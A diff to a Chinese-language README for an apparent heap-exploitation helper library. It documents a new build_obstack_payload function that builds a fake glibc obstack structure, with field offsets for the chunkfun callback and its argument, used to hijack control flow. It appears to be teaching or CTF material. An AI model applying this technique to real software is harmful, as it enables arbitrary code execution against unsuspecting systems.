@@ -41,7 +41,12 @@ C PoC 使用合法 API 设置回调，所以 API 本身不是漏洞；文件末�
 
 ## Python 离线板子
 
-[`obstack.py`](./obstack.py) 提供 `build_obstack_plan`，生成旧 Obstack 消费路径的 obstack 字段计划。
+[`obstack.py`](./obstack.py) 提供两个函数：
+
+```text
+build_obstack_plan    -> 返回 ObstackPlan
+build_obstack_payload -> 返回 fake obstack 的 MemoryWrite 镜像
+```
 
 ### 函数用途
 
@@ -50,7 +55,7 @@ C PoC 使用合法 API 设置回调，所以 API 本身不是漏洞；文件末�
 ### 最小使用示例
 
 ```python
-from obstack import build_obstack_plan
+from obstack import build_obstack_payload, build_obstack_plan
 
 plan = build_obstack_plan(
     object_base=0x100000,     # 当前 chunk 起点
@@ -62,6 +67,16 @@ plan = build_obstack_plan(
 # 返回 ObstackPlan 数据类
 print(plan.object_base, plan.next_free, plan.chunk_limit,
       hex(plan.chunkfun), hex(plan.extra_arg), plan.use_extra_arg)
+
+writes = build_obstack_payload(
+    obstack_addr=0x200000,
+    object_base=0x100000,
+    next_free=0x101000,
+    chunkfun_addr=0x401234,
+    extra_arg=0x500000,
+)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
 ```
 
 ### 对应 PoC
@@ -88,6 +103,24 @@ print(plan.object_base, plan.next_free, plan.chunk_limit,
 | `chunkfun` | 分配回调地址。 |
 | `extra_arg` | callback 第一个参数。 |
 | `use_extra_arg` | 固定为 1，表示 chunkfun 带 extra_arg 调用。 |
+
+### 返回对象 `MemoryWrite`
+
+`build_obstack_payload` 返回一个 `MemoryWrite`：
+
+```text
+address = obstack_addr
+data    = 0x70 字节 fake obstack 镜像
+label   = "fake obstack object"
+
+镜像关键字段：
+    +0x38  chunkfun
+    +0x40  extra_arg
+    +0x50  use_extra_arg = 1
+    +0x58  object_base
+    +0x60  next_free
+    +0x68  chunk_limit
+```
 
 ### 调用者必须提供
 
